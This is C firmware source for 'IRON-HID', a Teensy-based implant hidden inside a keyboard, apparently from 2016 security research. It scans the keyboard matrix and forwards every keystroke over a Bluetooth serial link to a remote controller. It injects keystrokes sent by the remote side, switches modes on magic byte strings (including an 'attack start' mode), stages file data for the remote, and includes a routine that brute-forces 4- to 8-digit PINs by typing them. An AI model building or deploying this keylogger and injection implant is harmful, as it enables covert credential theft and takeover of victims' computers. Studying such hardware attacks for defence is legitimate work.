/*
            IRON-HID Firmware for At90USB1286 in Teensy2.0++       
                    Copyright (C) 2016 Seunghun Han 
         at National Security Research Institute of South Korea
*/

/*
Copyright (c) 2016 Seunghun Han at NSR of South Kora

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/


#include <string.h>
#include <avr/interrupt.h>
#include <avr/sleep.h>
#include <avr/pgmspace.h>
#include <avr/power.h>
#include <avr/wdt.h>
#include <avr/delay.h>


////////////////////////////////////////////////////////////////////
// Keyboard Product Setting
////////////////////////////////////////////////////////////////////
#define CHERRY_COMPACT           // Wired Type Keyboard
//#define MATIAS_TACTILE_PRO     // Built-in Hub Type Keyboard
//#define MATIAS_LAPTOP_PRO      // Wireless Type Keyboard
#include "KeyboardMain.h"
#include "Lib/core_pins.h"
#include "Lib/HardwareSerial.h"
#include "Image.h"
#include "Keymap.h"

// PIN 20~21 for toggle switch

////////////////////////////////////////////////////////////////////
// Gobal Function
// PC(Host) <---> Arduino(atmaga16u2 <-> atmega328) <---> Android(Remote)
////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////
//  Global Variable
////////////////////////////////////////////////////////////////////
char g_vcRemoteBuffer[2][512];
int g_viRemoteBufferIndex[2] = { 0, 0 };

int g_iRecvMode = MODE_CMD_RECV;
int g_iMatchMode = MODE_UNKNOWN;
int g_iNextIndex = 0;

// TODO: Change magic string to none ASCII range 0
char g_vcModeMagicString[][16] = {
 { 0xB2, 0xF9, 0xF4, 0xF7, 0x43, 0xE6, 0xF9, 0x72, 0x4D, 0x9F, 0xC8, 0x25, 0x52, 0x29, 0xCA, 0x1A },  // CMD Recv Mode Magic
 { 0xEF, 0x12, 0x21, 0xFB, 0xC9, 0xDA, 0x5D, 0x56, 0x69, 0x4A, 0x60, 0x08, 0x89, 0x90, 0xD4, 0x11 },  // Key Recv Mode Magic
 { 0x5C, 0x7A, 0xCE, 0xBC, 0x80, 0x74, 0x5B, 0x37, 0x56, 0x63, 0x60, 0x16, 0x68, 0x97, 0x88, 0xC1 },  // Data Recv Mode Magic
 { 0xa9, 0x0b, 0x3c, 0x2c, 0xe3, 0xc5, 0x83, 0x44, 0x84, 0xad, 0xe3, 0x29, 0xf7, 0x0a, 0x3f, 0x91 },  // Attack Start Mode Magic
};

// For Teensy
int g_iInputRowStart = 8;
int g_iInputRowCount = 8;
int g_iOutputColStart = 26;
int g_iOutputColCount = 18;

int g_iLEDPinStart = 16;
int g_cLEDState = 0;
int g_cPrevLEDKeyState = 0;

char g_cAttackStart = 0;
char g_cAttackResult = 0;

USBREPORT g_stReport;

// Prev Key State
unsigned char g_vcPrevKeyState[MAX_COL] = { 0x00 };

#define PIN_LED             6
#define PIN_BUTTON_OUTPUT   21      // Connect to ground
#define PIN_BUTTON_INPUT    20      // Pull up

////////////////////////////////////////////////////////////////////
//  Implementation
////////////////////////////////////////////////////////////////////
/**
 *  Setup hardware.
 */
void setup()
{
	char cTemp = 0;
	int i;

	// Input row setup
	for (i = 0 ; i < g_iInputRowCount ; i++)
	{
#ifndef CHERRY_COMPACT
		pinMode(g_iInputRowStart + i, INPUT);
		digitalWrite(g_iInputRowStart + i, HIGH);
#else
		pinMode(g_iInputRowStart + i, OUTPUT);
		digitalWrite(g_iInputRowStart + i, LOW);
#endif
	}
  
	// Output col setup
	for (i = 0 ; i < g_iOutputColCount ; i++)
	{
#ifndef CHERRY_COMPACT
		pinMode(g_iOutputColStart + i, OUTPUT);
		digitalWrite(g_iOutputColStart + i, HIGH);
#else
		pinMode(g_iOutputColStart + i, INPUT);
		digitalWrite(g_iOutputColStart + i, HIGH);
#endif
	}

	// LED status
	for (i = 0 ; i < LED_COUNT ; i++)
	{
	pinMode(g_iLEDPinStart + i, OUTPUT);
	digitalWrite(g_iLEDPinStart + i, HIGH);
	}
	g_cLEDState = 0;
	g_cPrevLEDKeyState = 0;

	// Initialize key state
	memset(g_vcPrevKeyState, 0xFF, sizeof(g_vcPrevKeyState));
	memset(&g_stReport, 0, sizeof(g_stReport));

	// Initialize finder
	InitMagicStringFinder();

	// Firmware <--> Commander
	Serial1.begin(115200);


	// Update bluetooth's information
#if 0
	delay(1000);

	Serial1.print("$$$");
	delay(1000);

	Serial1.print("SN,Proxy\n");
	delay(3000);

	Serial1.print("SP,1111\n");
	delay(3000);

	Serial1.print("R,1\n");
	delay(5000);

	Serial1.print("---");
	delay(3000);

	while(1)
	{
		delay(3000);
	}

#endif

#ifdef MATIAS_LAPTOP_PRO
	// Firmware <--> Host Bluetooth
	Serial2.begin(115200);

	// Input for button press check
	pinMode(PIN_BUTTON_INPUT, INPUT);
	digitalWrite(PIN_BUTTON_INPUT, HIGH);

	pinMode(PIN_BUTTON_OUTPUT, OUTPUT);
	digitalWrite(PIN_BUTTON_OUTPUT, LOW);  
#endif

	while(Serial1.available())
	{
		cTemp = Serial1.read();
	}

	pinMode(PIN_LED, OUTPUT);
}

/**
 *  Do periodic work.
 */ 
void loop()
{
	int iIndex;
	char cData;


	// Remote to Host(Bluetooth to Serial)
	iIndex = g_viRemoteBufferIndex[g_iRecvMode];
	if (iIndex < sizeof(g_vcRemoteBuffer[0]))
	{
		ProcessRemoteCMD();
	}

	// Send Pin number
	// If you want to test PIN vulnerability, comment out under line
	//SendPinPattern();
}

/**
 *  Process remote command.
 */
void ProcessRemoteCMD(void)
{
	char cData;
	int iCopySize;
	int iIndex;

	while (Serial1.available())
	{
		cData = Serial1.read();
		//Serial1.write(cData);

		// No magic string, then save data to buffer
		if (MatchMagicString(cData) == false)
		{
			cli();
			iIndex = g_viRemoteBufferIndex[g_iRecvMode];
	
			iCopySize = DumpBufferdDataForMagicString(g_vcRemoteBuffer[g_iRecvMode] + 
				iIndex);
			iIndex += iCopySize;
			g_vcRemoteBuffer[g_iRecvMode][iIndex] = cData;
			iIndex++;

			g_viRemoteBufferIndex[g_iRecvMode] = iIndex;
			sei();
		}
	}
}

/**
 *  Get sector data, 512 Bytes.
 */
extern "C" void GetSectorData(int iSectorNumber)
{
	char *pcBuffer;
	int i;
	int j;
	char cData;
	int iLength;
	int iCount;
	int iSend = 0;

	if (iSectorNumber >= g_iSectorCount)
	{
		memset(g_vcSectorBuffer, 0x00, 512);
		return ;
	}

	// Get Sector Buffer
	pcBuffer = (char*)pgm_read_word(&(g_vcSectors[iSectorNumber]));
	iLength = (int)pgm_read_word(&(g_viSectorLength[iSectorNumber]));

	if (iLength < 512)
	{
		Serial1.print("D;;Encoded;");
	}
	else
	{
		Serial1.print("D;;Normal;");
	}

	// Read from Flash~!!
	for (i = 0 ; i < iLength ; i++)
	{
		if (iLength < 512)
		{
			if (i % 2 == 0)
			{
				iCount = pgm_read_byte_near(pcBuffer + i);
			}
			else
			{
				cData = pgm_read_byte_near(pcBuffer + i); 
				for (j = 0 ; j < iCount ; j++)
				{
					g_vcSectorBuffer[iSend] = cData;
					iSend++;
				}
			}
		}
		else
		{
			// Normal Write
			cData = pgm_read_byte_near(pcBuffer + i); 
			g_vcSectorBuffer[iSend] = cData;
			iSend++;
		}
	}
}

/**
 *  Send file chunk data to remote.
 */
void SendFileDataToRemote(char* pcBuffer, int iSize)
{
	Serial1.print("F;;");
	Serial1.write((const uint8_t*)pcBuffer, iSize);
	Serial1.print(";");
}

/**
 *  Get remote data.
 *		- First byte is the length of filled data
 */
void GetRemoteCMDFromBuffer(char* pcBuffer, int iSize)
{
	int i;
	int iLoopCnt;
	int iFillCnt;
	char cLength;

	// Reserve first byte for buffer length
	iSize = iSize - 1;

	if (g_viRemoteBufferIndex[BUFFER_INDEX_CMD] < iSize)
	{
		iLoopCnt = g_viRemoteBufferIndex[BUFFER_INDEX_CMD];
	}
	else
	{
		iLoopCnt = iSize;
	}
	
	// Set first byte to buffer length
	pcBuffer[0] = (char) iLoopCnt;
	if (iLoopCnt > 0)
	{
		memcpy(pcBuffer + 1, (const uint8_t*) g_vcRemoteBuffer[BUFFER_INDEX_CMD], 
			iLoopCnt);

		memcpy(g_vcRemoteBuffer[BUFFER_INDEX_CMD], g_vcRemoteBuffer[BUFFER_INDEX_CMD] + 
			iLoopCnt, g_viRemoteBufferIndex[BUFFER_INDEX_CMD] - iLoopCnt);   
		g_viRemoteBufferIndex[BUFFER_INDEX_CMD] -= iLoopCnt;
	}
}

/**
 *  Send Commander's keyboard events to host(USB HID or bluetooth HID).
 */
void SendKeyToHost(bool bOnlySendRemoteKey)
{
	bool bAlreadySent;

	bAlreadySent = false;

	// Save key press information
	SaveKeyDataToHost();
	// Check all key is released
	if (IsAllKeyIsReleased() == true)
	{
		// Then, send remote keys
		bAlreadySent = SendRemoteKeyToHost();
	}

	if (bOnlySendRemoteKey == true)
	{
		return ;
	}

	if (bAlreadySent == false)
	{
		// If Matias Laptop Pro, send key to bluetooth
#ifdef MATIAS_LAPTOP_PRO
		unsigned char vcHeaderNormal[3] = { 0xFD, 0x09, 0x01 };
		unsigned char vcHeaderCustom[3] = { 0xFD, 0x03, 0x03 };
		unsigned char vcConvertKey[2] = { 0x00, 0x00 };

		// FN + Other Key Combination
		ConvertFNKey(&g_stReport, vcConvertKey);
		Serial2.write(vcHeaderNormal, sizeof(vcHeaderNormal));
		Serial2.write((unsigned char*)&g_stReport, sizeof(g_stReport));    

		Serial2.write(vcHeaderCustom, sizeof(vcHeaderCustom));
		Serial2.write(vcConvertKey, sizeof(vcConvertKey));
#endif

		ToggleLEDState(&g_stReport);    
	}
}

/**
 *  Set keyboard LED state.
 */
void SetLEDState(char cLED)
{
  int i;
  
  // Set LED
  for (i = 0 ; i < LED_COUNT ; i++)
  {
    if (cLED & (1 << i))
    {
      digitalWrite(g_iLEDPinStart + i, LOW);
    }
    else
    {
      digitalWrite(g_iLEDPinStart + i, HIGH);
    }
  }

  g_cLEDState = cLED;
}


/**
 *  Check LED key pressed.
 */
char CheckLEDKeyPressed(USBREPORT* pstUSBReport)
{
	char vcLEDKey[3] = { KEY_NUMLOCK, KEY_CAPSLOCK, KEY_SCROLLLOCK };
	char cCurLEDKeyState = 0;
	char cNewLEDState = 0;
	int i;
	int j;

	// Check LED key state
	for (i = 0 ; i < MAX_KEYCODE ; i++)
	{
		for (j = 0 ; j < sizeof(vcLEDKey) ; j++)
		{
			if (pstUSBReport->vcKeyCode[i] == vcLEDKey[j])
			{
				cCurLEDKeyState ^= (0x01 << j);
			}
		}
	}

	// Check key press now
	for (i = 0 ; i < sizeof(vcLEDKey) ; i++)
	{
		if (((g_cPrevLEDKeyState & (0x01 << i)) == 0) &&
			((cCurLEDKeyState & (0x01 << i)) != 0))
		{
			cNewLEDState |= (0x01 << i);
		}
	}

	g_cPrevLEDKeyState = cCurLEDKeyState;

	return cNewLEDState;
}

/**
 *  Toggle LED State.
 */
void ToggleLEDState(USBREPORT* pstUSBReport)
{
	char cLEDKeyPressed;
	char cToggledLEDState = g_cLEDState;

	// Check LED key state
	cLEDKeyPressed = CheckLEDKeyPressed(pstUSBReport);

	// LED Key is pressed now, change LED state
	if (cLEDKeyPressed != 0)
	{
		cToggledLEDState ^= cLEDKeyPressed;
		SetLEDState(cToggledLEDState);  
	}
}

/**
 *  Save key pressed data to global variable.
 *
 *  New cherry compact keyboard has no diod, so we need different processing  
 */
bool SaveKeyDataToHost()
{
  unsigned char cKeyCode;
  USBREPORT stReport;
  int iIndex = 0;
  int iChanged = 0;
  char cData;
  char cInput;
  int i;
  int j;
  unsigned char g_vcCurKeyState[MAX_COL];
    
  memset(&stReport, 0x00, sizeof(stReport)); 
  
#ifndef CHERRY_COMPACT
  // Check key down & compare with previous state
  for (j = 0 ; j < MAX_COL ; j++)
  {
    // Column set low so check row
    digitalWrite(g_iOutputColStart + j, LOW);

    g_vcCurKeyState[j] = PINA;
    
    // Column set high
    digitalWrite(g_iOutputColStart + j, HIGH);

    if (g_vcCurKeyState[j] != g_vcPrevKeyState[j])
    {
      iChanged = 1;
    }
  }
#else  
  memset(g_vcCurKeyState, 0xFF, sizeof(g_vcCurKeyState));

  // Check key down
  for (j = 0 ; j < MAX_ROW ; j++)
  {
    digitalWrite(g_iInputRowStart + j, LOW);
        
    for (i = 0 ; i < MAX_COL ; i++)
    {
      // Key down
      if (digitalRead(g_iOutputColStart + i) == 0)
      {
        g_vcCurKeyState[i] ^= (0x01 << j);      
      }
    }
    digitalWrite(g_iInputRowStart + j, HIGH);
  }

  // Compare with previous state
  for (j = 0 ; j < MAX_COL ; j++)
  {
    if (g_vcCurKeyState[j] != g_vcPrevKeyState[j])
    {
      iChanged = 1;
    }
  }
#endif

  // Compare
  for (j = 0 ; (j < MAX_COL) && (iIndex < sizeof(stReport.vcKeyCode)) ; j++)
  {
    if (g_vcCurKeyState[j] == 0xFF)
    {
      continue;
    }
    
    for (i = 0 ; i < g_iInputRowCount ; i++)
    {
      cData = g_vcCurKeyState[j] & (0x01 << i);
      
      if (cData != 0)
      {
        continue; 
      }

      cKeyCode = g_vcKeyMaxtrix[i][j];
      switch(cKeyCode)
      {
        case KEY_LCONTROL:
          stReport.cModifier |= MODIFIER_LCONTROL;
          break;
          
        case KEY_LSHIFT:
          stReport.cModifier |= MODIFIER_LSHIFT;
          break;

        case KEY_LALT:
          stReport.cModifier |= MODIFIER_LALT;
          break;

        case KEY_LGUI:
          stReport.cModifier |= MODIFIER_LGUI;
          break;

        case KEY_RCONTROL:
          stReport.cModifier |= MODIFIER_RCONTROL;
          break;

        case KEY_RSHIFT:
          stReport.cModifier |= MODIFIER_RSHIFT;
          break;

        case KEY_RALT:
          stReport.cModifier |= MODIFIER_RALT;
          break;

        case KEY_RGUI:
          stReport.cModifier |= MODIFIER_RGUI;
          break;

        default:
          stReport.vcKeyCode[iIndex] = cKeyCode;
          iIndex++;
          break;
      }
      
      // Report define total 8 byte(1 Modifier, 1 Reserved, 6 Key Code)
      if (iIndex >= sizeof(stReport.vcKeyCode))
      {
        break;
      }  
    }
  }
  
  // Send to atmega16u2
  if (iChanged > 0)
  {
    //Serial.write((unsigned char*)&stReport, sizeof(stReport));
    memcpy(&g_stReport, &stReport, sizeof(g_stReport));
    memcpy(g_vcPrevKeyState, g_vcCurKeyState, sizeof(g_vcPrevKeyState));
    
    // Send key data to remote
    Serial1.print("M;;");
    Serial1.write((unsigned char*)&g_stReport, sizeof(g_stReport));
    Serial1.print(";");
	return true;
  }
  else
  {
	  memcpy(&g_stReport, &stReport, sizeof(g_stReport));
  }
  
  return false;
}

/**
 *  Send remote key data to host.
 */
bool SendRemoteKeyToHost()
{
	int i;
	int iLength;
	int iLoopCnt;
	int iSendKeyByte;

	iLoopCnt = g_viRemoteBufferIndex[BUFFER_INDEX_KEY];
	if (iLoopCnt == 0)  
	{
		return false;
	}

	// Find terminator
	for (i = 0 ; i < iLoopCnt ; i++)
	{
		if (g_vcRemoteBuffer[BUFFER_INDEX_KEY][i] == (char)0xFF)
		{
			break;
		}
	}

	// Not found 
	if (i == iLoopCnt)
	{
		return false;
	}

	iLength = i;

	// 1 Modifier + 1 Reserved + 6 Keys
	if (iLength > 7)
	{
		iSendKeyByte = 6;
	}
	else
	{
		iSendKeyByte = iLength - 1;
	}
  
#ifdef MATIAS_LAPTOP_PRO
	unsigned char vcHeaderNormal[3] = { 0xFD, 0x09, 0x01 };

	Serial2.write(vcHeaderNormal, 3);
	Serial2.write((const uint8_t*) g_vcRemoteBuffer[BUFFER_INDEX_KEY], 1);
	Serial2.write(0x00);
	Serial2.write((const uint8_t*) g_vcRemoteBuffer[BUFFER_INDEX_KEY] + 1, 
		iSendKeyByte);
#else
	memset(&g_stReport, 0, sizeof(g_stReport));
	g_stReport.cModifier = (char) g_vcRemoteBuffer[BUFFER_INDEX_KEY][0];
	memcpy(g_stReport.vcKeyCode, (uint8_t*) g_vcRemoteBuffer[BUFFER_INDEX_KEY] + 1, 
		iSendKeyByte);
#endif

#ifdef MATIAS_LAPTOP_PRO
	if (iLength != 7)
	{
		iLoopCnt = 7 - iLength;
		for (i = 0 ; i < iLoopCnt ; i++)
		{
			Serial2.write(0x00);
		}
	}  
#endif

	memcpy(g_vcRemoteBuffer[BUFFER_INDEX_KEY], g_vcRemoteBuffer[BUFFER_INDEX_KEY] + 
		iLength + 1, g_viRemoteBufferIndex[BUFFER_INDEX_KEY] - iLength - 1);   
	g_viRemoteBufferIndex[BUFFER_INDEX_KEY] -= (iLength + 1);

	return true;
}

/**
 *  Check all key is released.
 */
bool IsAllKeyIsReleased()
{
	int i;

	if (g_stReport.cModifier != 0)
	{
		return false;
	}

	for (i = 0 ; i < sizeof(g_stReport.vcKeyCode) ; i++)
	{
		if (g_stReport.vcKeyCode[i] != 0)
		{
			return false;
		}
	}

	return true;
}

////////////////////////////////////////////////////////////////////
//  The Magic String Finder Code
////////////////////////////////////////////////////////////////////
/**
 *  Initialize the magic string finder.
 */
void InitMagicStringFinder()
{
	g_iMatchMode = MODE_UNKNOWN;
	g_iNextIndex = 0;
}

/**
 *  Match the magic string.
 */
bool MatchMagicString(char cData)
{
  int i;
  bool bRet = false;

  // Not yet
  if (g_iMatchMode == MODE_UNKNOWN)
  {
    for (i = 0 ; i < MODE_COUNT ; i++)
    {
      if (g_vcModeMagicString[i][0] == cData)
      {
        g_iMatchMode = i;
        break;
      }
    }

    // Found!!
    if (g_iMatchMode != MODE_UNKNOWN)
    {
      g_iNextIndex++;
      bRet = true;
    }
    return bRet;
  }
  else
  {
    // Not matched
    if (g_vcModeMagicString[g_iMatchMode][g_iNextIndex] != cData)
    {
      return bRet;
    }
    g_iNextIndex++;
    bRet = true;

    // Match the full magic string and change receive mode 
    if (g_iNextIndex >= sizeof(g_vcModeMagicString[0]))
    {
      switch(g_iMatchMode)
      {
        case MODE_CMD_RECV:
          g_iRecvMode = g_iMatchMode;      
          Serial1.print("D;;Change to cmd receive mode\n;"); 
          break;
          
        case MODE_KEY_RECV:
          g_iRecvMode = g_iMatchMode;      
          Serial1.print("D;;Change to key receive mode\n;"); 
          break;
          
        case MODE_DATA_RECV:
          g_iRecvMode = g_iMatchMode;      
          Serial1.print("D;;Change to data receive mode\n;"); 
          break;
          
        case MODE_ATTACK_START:
          g_cAttackStart = 1;
          Serial1.print("D;;Set attack mode\n;"); 
          break;
      } 
      
      // Initialize state
      InitMagicStringFinder();
    }

    return bRet;
  }
}

/**
 *  Dump saved magic string to buffer.
 */
int DumpBufferdDataForMagicString(char* pcBuffer)
{
  int iCopySize = 0;

  // Not yet matched
  if ((g_iMatchMode == MODE_UNKNOWN) || (g_iNextIndex == 0))
  {
    return iCopySize;
  }

  memcpy(pcBuffer, g_vcModeMagicString[g_iMatchMode], g_iNextIndex);
  iCopySize = g_iNextIndex;
  
  // Initialize
  InitMagicStringFinder();
  return iCopySize;
}

/**
 *  Check button and reset connection.
 */
void CheckButtonAndReset(void)
{
  char cData;
  
  // Check button pressed
  cData = digitalRead(PIN_BUTTON_INPUT);

  if (cData == 0)
  {
    // Delay for a while
    delay(2000);

    //Serial2.write(0x00);    
  }
}

#ifdef MATIAS_LAPTOP_PRO
/**
 *  If FN key is pressed, change key code to layer 2 key.
 */
bool ConvertFNKey(USBREPORT* pstUSBReport, unsigned char* pcConvertKey)
{
  int i;
  int j;
  bool bExistFNKey = false;
  
  // Check FN key pressed
  for (i = 0 ; i < sizeof(pstUSBReport->vcKeyCode) ; i++)
  {
    if (pstUSBReport->vcKeyCode[i] == KEY_FN)
    {
      bExistFNKey = true;
      pstUSBReport->vcKeyCode[i] = 0x00;
    }      
  }
  
  if (bExistFNKey == false)
  {
    return false;
  }

  // Find Other Key and Change it
  // Check FN Key
  for (i = 0 ; i < sizeof(pstUSBReport->vcKeyCode) ; i++)
  {
    for (j = 0 ; j < sizeof(g_vcLayer1Key) ; j++)
    {
      if (pstUSBReport->vcKeyCode[i] == g_vcLayer1Key[j])
      {
        // No multimedia key, only replace
        if (j > MULTIMEDIA_KEY_INDEX)
        {
          pstUSBReport->vcKeyCode[i] = (unsigned char) g_vcLayer2Key[j];
        }
        else
        {
          pstUSBReport->vcKeyCode[i] = 0x00;
          *(short*)pcConvertKey = g_vcLayer2Key[j];
          break;
        }
      }
    }
  }
  
  return bExistFNKey;
}
#endif

/**
 *	Send pin pattern to remote buffer.
 *		- If you add key code to remote buffer, IRON-HID send to the host.
 */
int g_iPinNumber = 0;
int g_iDigitCount = 4;		// Minimum pin number
void SendPinPattern()
{
	char vcBuffer[40];

	if (IsRemoteKeyBufferEmpty() == false)
	{
		return ;
	}

	if (g_iPinNumber > 99999999)
	{
		return ;
	}

	switch(g_iDigitCount)
	{
		case 4:
			sprintf(vcBuffer, "%04d", g_iPinNumber);
			if (g_iPinNumber == 9999)
			{
				g_iPinNumber = 0;
				g_iDigitCount++;
			}
			break;

		case 5:
			sprintf(vcBuffer, "%05d", g_iPinNumber);
			if (g_iPinNumber == 99999)
			{
				g_iPinNumber = 0;
				g_iDigitCount++;
			}
			break;

		case 6:
			sprintf(vcBuffer, "%06d", g_iPinNumber);
			if (g_iPinNumber == 999999)
			{
				g_iPinNumber = 0;
				g_iDigitCount++;
			}
			break;

		case 7:
			sprintf(vcBuffer, "%07d", g_iPinNumber);
			if (g_iPinNumber == 9999999)
			{
				g_iPinNumber = 0;
				g_iDigitCount++;
			}
			break;
			
		case 8:
			sprintf(vcBuffer, "%08d", g_iPinNumber);
			if (g_iPinNumber == 99999999)
			{
				g_iPinNumber = 0;
				g_iDigitCount++;
			}
			break;
	}
	
	g_iPinNumber++;

	AddNumberToRemoteKeyBuffer(vcBuffer);
	_delay_ms(200);

	// Send Log
	if ((g_iPinNumber % 100) == 0)
	{
		sprintf(vcBuffer, "Phase: %d\r\n", g_iPinNumber);
		Serial1.print(vcBuffer);
	}
}

/**
 *	Is remote key buffer empty?
 */
bool IsRemoteKeyBufferEmpty()
{
	if (g_viRemoteBufferIndex[BUFFER_INDEX_KEY] == 0)
	{
		return true;
	}

	return false;
}

/**
 *	Add number key to remote buffer
 */
void AddNumberToRemoteKeyBuffer(char* pcNumberString)
{
	char vcNumberKeyCode[10] = { 39, 30, 31, 32, 33, 34, 35, 36, 37, 38 };
	char cData;
	int iIndex;

	// Insert number key
	for (int i = 0 ; i < strlen(pcNumberString) ; i++)
	{
		cData = vcNumberKeyCode[pcNumberString[i] - '0'];
		
		iIndex = g_viRemoteBufferIndex[BUFFER_INDEX_KEY];
		
		g_vcRemoteBuffer[BUFFER_INDEX_KEY][iIndex] = 0x00;
		g_vcRemoteBuffer[BUFFER_INDEX_KEY][iIndex + 1] = cData;
		g_vcRemoteBuffer[BUFFER_INDEX_KEY][iIndex + 2] = 0xFF;
		g_vcRemoteBuffer[BUFFER_INDEX_KEY][iIndex + 3] = 0x00;
		g_vcRemoteBuffer[BUFFER_INDEX_KEY][iIndex + 4] = 0x00;
		g_vcRemoteBuffer[BUFFER_INDEX_KEY][iIndex + 5] = 0xFF;
	
		iIndex += 6;
		g_viRemoteBufferIndex[BUFFER_INDEX_KEY] = iIndex;
	}

	// Insert enter key
	iIndex = g_viRemoteBufferIndex[BUFFER_INDEX_KEY];
	g_vcRemoteBuffer[BUFFER_INDEX_KEY][iIndex] = 0x00;
	g_vcRemoteBuffer[BUFFER_INDEX_KEY][iIndex + 1] = 40;
	g_vcRemoteBuffer[BUFFER_INDEX_KEY][iIndex + 2] = 0xFF;
	g_vcRemoteBuffer[BUFFER_INDEX_KEY][iIndex + 3] = 0x00;
	g_vcRemoteBuffer[BUFFER_INDEX_KEY][iIndex + 4] = 0x00;
	g_vcRemoteBuffer[BUFFER_INDEX_KEY][iIndex + 5] = 0xFF;

	iIndex += 6;
	g_viRemoteBufferIndex[BUFFER_INDEX_KEY] = iIndex;
}
